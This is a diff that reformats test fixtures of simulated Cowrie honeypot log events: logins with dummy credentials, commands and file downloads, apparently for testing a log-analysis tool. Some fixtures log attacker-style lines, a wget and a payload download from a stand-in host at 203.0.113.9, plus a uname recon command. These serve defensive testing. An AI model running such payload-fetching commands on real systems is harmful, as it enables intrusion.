@@ -37,31 +37,54 @@ SESSIONS = {
     "late": [event("cowrie.session.connect", "2019-05-18T10:00:00.000001Z")],
     "failed": [
         event("cowrie.session.connect", "2019-05-18T01:00:00.000000Z"),
-        event("cowrie.login.failed", "2019-05-18T01:00:02.000000Z",
-              username="jay", password="hunter2secret"),
+        event(
+            "cowrie.login.failed",
+            "2019-05-18T01:00:02.000000Z",
+            username="jay",
+            password="hunter2secret",
+        ),
     ],
     "worked": [
-        event("cowrie.login.success", "2019-05-18T02:00:00.000000Z",
-              username="root", password="toor-secret"),
-        event("cowrie.command.success", "2019-05-18T02:00:05.000000Z",
-              message="Command found: wget http://203.0.113.9/x"),
+        event(
+            "cowrie.login.success",
+            "2019-05-18T02:00:00.000000Z",
+            username="root",
+            password="toor-secret",
+        ),
+        event(
+            "cowrie.command.success",
+            "2019-05-18T02:00:05.000000Z",
+            message="Command found: wget http://203.0.113.9/x",
+        ),
     ],
     "recon": [
-        event("cowrie.login.success", "2019-05-18T02:30:00.000000Z",
-              username="pi", password="raspberry-secret",
-              message="login attempt [pi/raspberry-secret] succeeded"),
-        event("cowrie.command.success", "2019-05-18T02:30:05.000000Z",
-              message="Command found: uname -a"),
+        event(
+            "cowrie.login.success",
+            "2019-05-18T02:30:00.000000Z",
+            username="pi",
+            password="raspberry-secret",
+            message="login attempt [pi/raspberry-secret] succeeded",
+        ),
+        event(
+            "cowrie.command.success",
+            "2019-05-18T02:30:05.000000Z",
+            message="Command found: uname -a",
+        ),
     ],
     "download": [
-        event("cowrie.login.success", "2019-05-18T03:00:00.000000Z",
-              username="admin", password="x"),
-        event("cowrie.session.file_download", "2019-05-18T03:00:04.000000Z",
-              url="http://203.0.113.9/payload"),
+        event(
+            "cowrie.login.success", "2019-05-18T03:00:00.000000Z", username="admin", password="x"
+        ),
+        event(
+            "cowrie.session.file_download",
+            "2019-05-18T03:00:04.000000Z",
+            url="http://203.0.113.9/payload",
+        ),
     ],
     "nowhere": [event("cowrie.session.connect", "2019-05-18T00:30:00.000000Z", geo={})],
-    "oddname": [event("cowrie.login.failed", "2019-05-18T04:00:00.000000Z",
-                      username="x" * 40, password="p")],
+    "oddname": [
+        event("cowrie.login.failed", "2019-05-18T04:00:00.000000Z", username="x" * 40, password="p")
+    ],
 }
 
 
